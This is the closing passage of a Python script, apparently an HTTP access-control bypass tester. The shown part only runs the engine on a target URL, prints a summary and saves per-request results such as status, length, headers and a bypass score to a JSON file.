    print(f"{Colors.GRAY}Categories: {', '.join(categories)}{Colors.RESET}")
    print()
    
    results = engine.run(args.url, categories)
    
    # Print summary
    engine.print_summary()
    
    # Save results if requested
    if args.output:
        output_data = {
            "target": args.url,
            "timestamp": time.time(),
            "baseline": {
                "status": engine.baseline_status,
                "length": engine.baseline_length
            },
            "results": [
                {
                    "url": r.url,
                    "technique": r.technique,
                    "category": r.category,
                    "status": r.status,
                    "length": r.length,
                    "method": r.method,
                    "headers": r.headers,
                    "is_bypass": r.is_bypass,
                    "bypass_score": r.bypass_score,
                    "response_time": r.response_time,
                }
                for r in results
            ]
        }
        
        with open(args.output, "w") as f:
            json.dump(output_data, f, indent=2)
        
        print(f"{Colors.GREEN}[✓] Results saved to {args.output}{Colors.RESET}")

if __name__ == "__main__":
    main()
